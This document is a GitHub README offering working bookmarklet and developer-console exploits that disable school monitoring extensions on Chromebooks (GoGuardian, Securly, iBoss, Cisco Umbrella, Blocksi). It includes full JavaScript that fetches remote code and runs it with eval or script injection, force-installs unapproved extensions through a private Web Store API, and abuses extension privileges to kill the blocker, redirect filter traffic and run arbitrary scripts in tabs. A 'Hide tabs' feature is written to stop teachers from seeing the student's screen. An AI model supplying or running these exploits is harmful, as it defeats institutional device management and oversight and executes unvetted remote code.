
# NoGuardian ChomeBook Bypass
Exploit to Disable Chrome Extentions (to Bypass GoGuardian)
A bookmarklet to disable extensions based on LTBEEF with an interface based on the chrome extension page. Here are the steps to exploit to ChromeBook Extensions (to Bypass GoGuardian)

https://tylerhalltech.com/noguardian <br>
https://tylerhalltech.com/noguardian2


## OVERVIEW:

 1. [INGOT METHOD](#1-ingot-method--patched-)
 2. [EXTENSION LAUNCHER METHOD](#2-extension-launcher-method)
 3. [POINT BLANK SWAP LAUNCHER METHOD](#3-point-blank-swap-launcher-method)

## USAGE: 

<details><summary>1) INGOT METHOD (!! PATCHED !!)</summary>
<br>
Ingot has been patched on Chrome 106 or after. This will not be updated.

**1A) BOOKLET METHOD -- INGOT**
  For easy setup go the the website at https://tylerhalltech.com/noguardian or https://tylerhalltech.com/noguardian2
  1) Show your bookmarks bar with `ctrl + shift + b`
  2) Right click on the bar and choose Add Page
  3) Set the name to Ingot and the URL to the code above or:
    3a) [HERE](https://github.com/tyhallcsu/noguardian/blob/main/exploit.js), [HERE](https://github.com/tyhallcsu/noguardian/blob/main/exploit2.js), or [HERE](https://github.com/tyhallcsu/noguardian/blob/main/exploit3.js)
  4) Go to [https://chrome.google.com/webstore_](https://chrome.google.com/webstore_)
  5) Click one of the bookmarkets you just created

**1B) MANUAL CONSOLE METHOD -- INGOT**
  1) Go to [https://chrome.google.com/webstore_](https://chrome.google.com/webstore_)
  2) Press `Ctrl + Shift + I` on the 404 page to open Chrome's Developer Tools.
  3) Go to the CONSOLE tab
  4) Paste the code from one of the three code snippets below and press enter
```
 fetch(`https://tylerhalltech.com/exploit.js`).then(data=>{data.text().then(text=>{eval(text)})});
```

```
 (function () {var a = document.createElement('script');a.src ='https://cdn.jsdelivr.net/gh/FogNetwork/Ingot@latest/ingot.min.js';document.body.appendChild(a);}())
```

```
 (function () {var a = document.createElement('script');a.src ='https://cdn.jsdelivr.net/gh/FogNetwork/Ingot@latest/ingot.min.js';document.body.appendChild(a);}())
```
 5) You should now be able to disable any Google Chrome extension (including GoGuardian)
</details>

----------------

<details><summary>2) EXTENSION LAUNCHER METHOD</summary>
 <br>
A bookmarklet capable of installing extensions, for those without a allowlist.

**2A) Extension Launcher (Bookmarlet)**
  1) GO [HERE](https://raw.githubusercontent.com/tyhallcsu/noguardian/main/exploit4.js)
  2) Show your bookmarks bar with `ctrl + shift + b`
  3) Select all code, and drop into bookmarklet bar
  4) Navigate to https://chrome.google.com/webstorex
  5) Click the bookmarklet from step #3
  6) Put the icon of the extension, the id, and name of it (Doesn't matter just put anything) press download, and it will work. 
  **Extra Notes** - If bookmarklets are blocked, you can use the MANUAL method below

**2B) Extension Launcher (Manual Method)**
  1) Navigate to https://chrome.google.com/webstorex
  2) Press `Ctrl + Shift + I` on the page to open Chrome's Developer Tools.
  3) Paste the code from [HERE](https://raw.githubusercontent.com/tyhallcsu/noguardian/main/exploit4.js) into the console and press enter -- Extension Launcher will load
  4) Put the icon of the extension, the id, and name of it (Doesn't matter just put anything) press download, and it will work. 
  5) **Extra Notes** - If bookmarklets are blocked - This will not work if you have a blocklist this is only for if when you go to the webstore it shows blocked
</details>

----------------

<details><summary>3) POINT BLANK SWAP LAUNCHER METHOD</summary>
 <br>
This exploit allows you to run scripts, on extensions pages.

**3A) Point Blank Swap Launcher (Bookmarlet)**
  1) GO [HERE](https://raw.githubusercontent.com/tyhallcsu/noguardian/main/exploit5.js)
  2) Show your bookmarks bar with `ctrl + shift + b`
  3) Select all code, and drop into bookmarklet bar
  4) Navigate to:
    4a) If you have Securly go to [HERE](https://tinyurl.com/bettergoofcurly)
    4b) If you have iBoss go to [HERE](https://tinyurl.com/goofboss)
    4c) If you have Cisco Umbrella go to [HERE](https://tinyurl.com/goofumbrella)
    4d) If you have Blocksi go to [HERE](https://tinyurl.com/goofsi)
    4e) If you have GoGuardian go to [HERE](https://tinyurl.com/goofguardian)
  5) Now most of these links are a block page (this is intentional) on each page should have a blue link, click the link on the page
  6) If it opens a blank page, click the bookmarklet from step #1 that you just made
  7) Click either hard disable or soft disable
  8) You can also run some of the scripts and run your own code, your extension may disable javascript being ran on it, so running your own code may not work. 
  **Extra notes** - I recommend doing soft disable, which only disables it until restart. - The launcher idea was from [Bypassi#7037](https://bolg.glitch.me/_/point-blank/)

**3B) Point Blank Swap Launcher (Manual Method)**
  1) Navigate to:
    1a) If you have Securly go to [HERE](https://tinyurl.com/bettergoofcurly)
    1b) If you have iBoss go to [HERE](https://tinyurl.com/goofboss)
    1c) If you have Cisco Umbrella go to [HERE](https://tinyurl.com/goofumbrella)
    1d) If you have Blocksi go to [HERE](https://tinyurl.com/goofsi)
    1e) If you have GoGuardian go to [HERE](https://tinyurl.com/goofguardian)
  2) Now most of these links are a block page (this is intentional) on each page should have a blue link, click the link on the page
  3) If it opens a blank page, continue to step #4
  4) Press `Ctrl + Shift + I` on the page to open Chrome's Developer Tools.
  5) Paste the code from [HERE](https://raw.githubusercontent.com/tyhallcsu/noguardian/main/exploit5.js) into the console and press enter -- Point Blank Swap Launcher will load
  6) Put the icon of the extension, the id, and name of it (Doesn't matter just put anything) press download, and it will work. 
  **Extra notes** - I recommend doing soft disable, which only disables it until restart. - The launcher idea was from [Bypassi#7037](https://bolg.glitch.me/_/point-blank/)
</details>

-------------------------

<details><summary>CODE SNIPPETS:</summary>
 <br>
Ingot has been patched on Chrome 106 or after. This will not be updated.

**INGOT EXPLOITS**
 
<details><summary>Exploit #1 (CUSTOM)</summary>

[Exploit #1](https://github.com/tyhallcsu/noguardian/blob/main/exploit.js) (CUSTOM)

```
fetch(`https://tylerhalltech.com/exploit.js`).then(data=>{data.text().then(text=>{eval(text)})});
```
 
</details>
 
-------------------------
 
<details><summary>Exploit #2 (INGOT)</summary>
<br>
[Exploit #2](https://github.com/tyhallcsu/noguardian/blob/main/exploit2.js) (INGOT)

```
(function () {var a = document.createElement('script');a.src = 'https://cdn.jsdelivr.net/gh/FogNetwork/Ingot@latest/ingot.min.js';document.body.appendChild(a);}())
```
 
 </details>
 
-------------------------
 
<details><summary>Exploit #3 (INGOT FIX)</summary>
 <br>
[Exploit #3](https://github.com/tyhallcsu/noguardian/blob/main/exploit3.js) (INGOT FIX)

```
(function () {var a = document.createElement('script');a.src = 'https://cdn.jsdelivr.net/gh/FogNetwork/Ingot@latest/ingot.min.js';document.body.appendChild(a);}())
```
 
 </details>
 
-------------------------
 
<details><summary>Exploit #4 Extension Launcher</summary>
 <br>
[Exploit #4](https://github.com/tyhallcsu/noguardian/blob/main/exploit4.js) -- Extension Launcher

A bookmarklet capable of installing extensions, for those without a allowlist.
<br>
 ```javascript: document.write(
 "<center><head><h1>Extension Launcher </h1></head></center><center><h3>Instructions: Put in the id of the extension, the icon of the extension, and the name of the extension</h3></center><center><br><input  id='icon' placeholder='Put Extension Icon here'></br></center><center><br><input id='name' placeholder='Put name here'></br></center><center><br><input id='extension' maxlength='32' placeholder='Put extension id here'></br></center><center><br><button id='submit'>Download</button></br></center>\n<style> textarea{border-radius: 25px; margin: 1 auto;margin-center: auto;margin-center: auto; text-align: center; align: center; display:inline-block;height:400px}*{box-sizing:border-box}body{padding:13px;font-size:110%;color:#fff;background-color:#2e2e31}h1{text-align:center;font-size:70px}h2{text-align:left;font-size:175%}button,input,pre,select,textarea{border-radius: 21px; color:#000;font-size:15px}h1,h2,h3,h4,button,label,p,select{font-family:Roboto,sans-serif}hr{border:none;border-bottom:3px solid #fff}input,kbd,pre,textarea{font-family:monospace;border:none}input,select,textarea{background-color:#fff;border-radius:25px; padding:13px 17px;border:none}button,input{background-color:#fff;padding:13px 100px;margin:20 5px 5px 0}input{width:600px;border-radius:25px}textarea{white-space:pre;float:center;width:60%;border-radius:25px; 0 0 10px;resize:none;background-color:#99edc3;margin-bottom:15px}pre{border-radius:25; 10px 10px 0;padding:13px;float:right;margin:0 0 25px;width:40%;overflow-y:scroll;word-break:break-all;white-space:pre-line;background-color:#1c8e40}button{border:none;border-radius:25px; cursor:pointer;transition:filter 250ms}button:hover{filter:brightness(.8)}.gg{background-color:#99edc3}a{color:#99edc3;transition:color 250ms}a:hover{color:#1c8e40}</style> "
 ),
 document.getElementById("submit").addEventListener(
 "click",
 function () {
  var empty = document.getElementById("extension").value;
  if (empty == "") {
    alert("Must put a id");
  }

  let icon = document.getElementById("icon").value;
  let name = document.getElementById("name").value;
  let extension = document.getElementById("extension").value;
  chrome.webstorePrivate.beginInstallWithManifest3(
    {
      esbAllowlist: !0,
      iconUrl: "" + icon,
      id: "" + extension,
      localizedName: "" + name,
      manifest:
        '{\n"update_url": "https://clients2.google.com/service/update2/crx",\n\n    "manifest_version": 2,\n    "content_security_policy": "script-src \'self\'; object-src \'self\';",\n    "minimum_chrome_version": "71.0.0.0",\n    "offline_enabled": true,\n    "content_scripts":\n    [\n        {\n            "js": [\n                "page.js",\n                "content.js"\n            ],\n            "matches": [ "file:///*", "http://*/*", "https://*/*" ],\n            "run_at": "document_start",\n            "all_frames": true\n        }\n    ],\n    "browser_action": {\n        "default_icon": {\n            "19": "images/icon_grey19.png",\n            "38": "images/icon_grey38.png",\n            "16": "images/icon_grey16.png",\n            "24": "images/icon_grey24.png",\n            "32": "images/icon_grey32.png"\n        },\n        "default_title": "Tampermonkey",\n        "default_popup": "action.html"\n    },\n    "icons": {\n        "32": "images/icon.png",\n        "48": "images/icon48.png",\n        "128": "images/icon128.png"\n    },\n    "incognito": "split",\n    "name": "Tampermonkey",\n    "short_name": "Tampermonkey",\n    "version": "4.18.0",\n    "description": "The world\'s most popular userscript manager",\n    "default_locale": "en",\n    "background": {\n       "page": "background.html"\n    },\n    "options_page": "options.html",\n    "options_ui": {\n        "page": "options.html",\n        "chrome_style": false,\n        "open_in_tab": true\n    },\n    "commands": {\n        "toggle-enable": {\n            "description": "Toggle enable state"\n        },\n        "open-dashboard": {\n            "description": "Open dashboard"\n        },\n        "open-dashboard-with-running-scripts": {\n            "description": "Open dashboard with the current tab\'s URL used as filter"\n        },\n        "open-new-script": {\n            "description": "Open new script tab"\n        }\n    },\n    "permissions": [\n        "notifications",\n        "unlimitedStorage",\n        "tabs",\n        "idle",\n        "webNavigation",\n        "webRequest", "webRequestBlocking",\n        "storage",\n        "contextMenus",\n        "chrome://favicon/",\n        "clipboardWrite",\n        "cookies",\n        "declarativeContent",\n        "<all_urls>"\n    ],\n    "optional_permissions" : [ "downloads" ]\n}\n',
    },
    function () {
      chrome.webstorePrivate.completeInstall("" + extension, function () {
        console.log(arguments);
      });
    }
  );
 },
 !1
 );
 ```

</details>
 
-----------------
  
<details><summary>Exploit #5 -- Point Blank Swap Launcher</summary>
<br>
[Exploit #5](https://github.com/tyhallcsu/noguardian/blob/main/exploit5.js) -- Point Blank Swap Launcher
<br>
This exploit allows you to run scripts, on extensions pages

```
javascript: (document = window.document),
  document.write(
    "<html>          <body>       <center><head>     <h1>[Point Blank Swap Launcher]</h1><center><h1>---Disabling---</h1></center>\n<center><button id='soft'>Soft Disable</button></center><center><button id='hard'>Hard Kill</button></center><center><button id='reload'>Reload Blocker</button></center><center><center><h1> ---Scripts--- </h1></center><center><button id='hide'>Hide tabs</button><button id='cool'>Create cool looking window</button></center><center><h3> Custom Notification </h3> </center> <input id='title' placeholder='Put title here'><input id='messer' placeholder='Put message here'><button id='notification'>Show Notification</button></center><center><button id='dns'>DNS emulator</button><center></center><center><center><center><h3>Run scripts as background </h3></center><textarea  id='code' placeholder='Put Code Here'></textarea></center><center><button id='google'>Run on google</button><button id='when'>When you click your extension</button></center><center></center> </body>\n          </html>\n <style> textarea{border-radius: 25px; margin: 1 auto;margin-center: auto;margin-center: auto; text-align: center; align: center; display:inline-block;height:400px}*{box-sizing:border-box}body{padding:13px;font-size:110%;color:#fff;background-color:#2e2e31}h1{text-align:center;font-size:70px}h2{text-align:left;font-size:175%}input {border-radius: 12px; color:#000;font-size:15px} textarea {border-radius: 21px; color:#000;font-size:15px} button,pre { border-radius: 12px; color:#000;font-size:15px}h1,h2,h3,h4,button,label,p,select{font-family:Roboto,sans-serif}hr{border:none;border-bottom:3px solid #fff}input,kbd,pre,textarea{ border-radiusfont-family:monospace;border:none}input,select,textarea{background-color:#fff;border-radius:25px; padding:13px 17px;border:none}button,input{background-color:#fff;padding:13px 100px;margin:20 5px 5px 0}input{width:600px;border-radius:25px}textarea{white-space:pre;float:center;width:60%;border-radius:25px; 0 0 10px;resize:none;background-color:#99edc3;margin-bottom:15px}pre{border-radius:25; 10px 10px 0;padding:13px;float:right;margin:0 0 25px;width:40%;overflow-y:scroll;word-break:break-all;white-space:pre-line;background-color:#1c8e40}button{border:none; cursor:pointer;transition:filter 250ms}button:hover{filter:brightness(.8)}.gg{background-color:#99edc3}a{color:#99edc3;transition:color 250ms}a:hover{color:#1c8e40}</style>\n"
  ),
  document.getElementById("hide").addEventListener(
    "click",
    function () {
      alert(
        "This will open a window, which your teacher will only be able to see the window this opens, so open another one after this one opens"
      ),
        (opener.chrome.tabs.captureVisibleTabAsync =
          opener.chrome.tabs.captureVisibleTabAsync || screenshot_old);
      opener.chrome.windows.getAllAsync =
        opener.chrome.windows.getAllAsync || get_tabs_old;
      clearInterval(spoof_int);
      if (spoof_int) alert("Your teacher can't see your screen now!");
      spoof_int = null;
      `
            : `;
      var spoof_int,
        visible_id = 0,
        screenshot_old =
          screenshot_old || opener.chrome.tabs.captureVisibleTabAsync,
        get_tabs_old = get_tabs_old || opener.chrome.windows.getAllAsync,
        get_tabs_new = function () {
          return new Promise((resolve, reject) => {
            get_tabs_old({
              populate: true,
              windowTypes: ["normal"],
            }).then((tabs) => {
              tabs.forEach((tab) => {
                if (tab.id === visible_id) resolve([tab]);
              });
            });
          });
        };
      opener.chrome.windows.create({ url: "https://google.com" }, (win) => {
        visible_id = win.id;
        spoof_int = setInterval(() => {
          opener.chrome.windows.getLastFocused((window) => {
            var visible = window.id === visible_id;
            opener.chrome.tabs.captureVisibleTabAsync = visible
              ? screenshot_old
              : null;
            opener.chrome.windows.getAllAsync = visible ? get_tabs_new : null;
          });
        }, 5);
      });
    },
    !1
  ),
  document.getElementById("cool").addEventListener(
    "click",
    function () {
      opener.chrome.windows.create({
        url: "https://www.google.com",
        type: "popup",
      });
    },
    !1
  ),
  document.getElementById("dns").addEventListener(
    "click",
    function () {
     opener.chrome.webRequest.onBeforeRequest.addListener(
  () => {
    return { redirectUrl: "javascript:" };
  },
  {
    urls: ["*://*.securly.com/*"],
  },
  ["blocking"]
);

    },
    !1
  ),
  document.getElementById("notification").addEventListener(
    "click",
    function () {
      opener.chrome.notifications.create(null, {
        type: "basic",
        iconUrl:
          "https://upload.wikimedia.org/wikipedia/en/9/9a/Trollface_non-free.png",
        title: "" + document.getElementById("title").value,
        message: "" + document.getElementById("messer").value,
      });
    },
    !1
  ),
  document.getElementById("google").addEventListener(
    "click",
    function () {
      alert("Go to google.com to see your code");
      javascript:(function(){opener.chrome.tabs.onUpdated.addListener((tabId, changeInfo, tab) => {
  if (changeInfo.status == "complete" && tab.url.includes('google.com')) {
    opener.chrome.tabs.executeScript(
      tabId, { code: `
      ` + document.getElementById("code").value
             }
    );
  }
})})()
    },
    !1
  ),
  document.getElementById("hard").addEventListener(
    "click",
    function () {
      javascript: (localStorage.cluster =
        "UNKNOWN_SCHOOL," +
        (confirm("This will disable your blocker until the removal of your account, if you want something less permanent use soft disable, continue?")
          ? 99999999999999
          : 0)),
        opener.chrome.extension.getBackgroundPage().location.reload();
    },
    !1
  ),
  document.getElementById("reload").addEventListener(
    "click",
    function () {
      localStorage.cluster = "UNKNOWN_SCHOOL,0";
      opener.chrome.runtime.reload();
    },
    !1
  ),
  document.getElementById("soft").addEventListener(
    "click",
    function () {
  document.getElementById("soft").innerHTML = "Disabled";
      opener.chrome.extension.getBackgroundPage().close();
    },
    !1
  ),
  document.getElementById("when").addEventListener(
    "click",
    function () {
      opener.chrome.browserAction.onClicked.addListener(() => {
        opener.chrome.tabs.query(
          { active: true, currentWindow: true },
          (tab) => {
            opener.chrome.tabs.executeScript(tab[0].id, {
              code:
                `
      ` + document.getElementById("code").value,
              matchAboutBlank: true,
            });
          }
        );
      });
      alert("Everytime you click your extension, your code will show");
    },
    !1
  );
  ```
 </details>
 
 Find more exploits here: https://3kh0.github.io/ext-remover/
 
